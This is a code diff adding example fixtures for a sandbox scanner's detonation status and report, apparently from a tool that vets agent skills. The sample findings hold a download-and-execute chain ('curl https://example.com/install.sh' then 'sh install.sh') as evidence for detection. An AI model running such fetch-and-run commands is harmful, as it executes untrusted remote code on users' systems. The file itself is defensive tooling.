@@ -3,6 +3,7 @@ import type {
   ArtifactRef,
   DaemonEvent,
   DecisionRecord,
+  DetonationStatusRecord,
   DiscoveredSkillRoot,
   DiscoveredWorkspace,
   DetonationReport,
@@ -116,6 +117,17 @@ export const exampleArtifactRef: ArtifactRef = {
   mimeType: "application/json",
 };
 
+export const exampleDetonationStatusRecord: DetonationStatusRecord = {
+  requestId: "detonation-001",
+  scanId: "scan-001",
+  slug: "example-skill",
+  contentHash: "sha256:example",
+  status: "completed",
+  runtime: "podman",
+  startedAt: "2026-03-08T00:00:02.000Z",
+  completedAt: "2026-03-08T00:00:03.000Z",
+};
+
 export const exampleDetonationReport: DetonationReport = {
   request: {
     requestId: "detonation-001",
@@ -124,8 +136,27 @@ export const exampleDetonationReport: DetonationReport = {
     timeoutSeconds: 90,
   },
   summary: "The skill attempted to download a remote shell script during setup.",
+  findings: [
+    {
+      ruleId: "CG-DET-STAGED-DOWNLOAD-EXECUTE",
+      severity: "critical",
+      message: "Behavioral detonation observed a staged download-and-execute chain.",
+      evidence: [
+        "Executed /usr/bin/curl https://example.com/install.sh",
+        "Executed /bin/sh /workspace/openclaw/skills/example-skill/install.sh",
+      ],
+    },
+  ],
+  score: 90,
+  recommendation: "block",
   triggeredActions: ["curl https://example.com/install.sh", "sh install.sh"],
-  artifacts: [exampleArtifactRef],
+  artifacts: [
+    {
+      ...exampleArtifactRef,
+      type: "detonation-report-json",
+      path: "/tmp/clawguard/artifacts/scan-001/detonation-report.json",
+    },
+  ],
   telemetry: [
     {
       eventId: "evt-001",
@@ -197,6 +228,8 @@ export const exampleDaemonResponseEnvelope: DaemonResponseEnvelope = {
     report: exampleStaticScanReport,
     decision: exampleDecisionRecord,
     artifacts: [exampleArtifactRef],
+    detonationStatus: exampleDetonationStatusRecord,
+    detonationReport: exampleDetonationReport,
   },
 };
 
@@ -207,6 +240,7 @@ export const exampleContracts = {
   staticScanReport: exampleStaticScanReport,
   threatIntelVerdict: exampleThreatIntelVerdict,
   artifactRef: exampleArtifactRef,
+  detonationStatusRecord: exampleDetonationStatusRecord,
   detonationReport: exampleDetonationReport,
   decisionRecord: exampleDecisionRecord,
   scanRecord: exampleScanRecord,
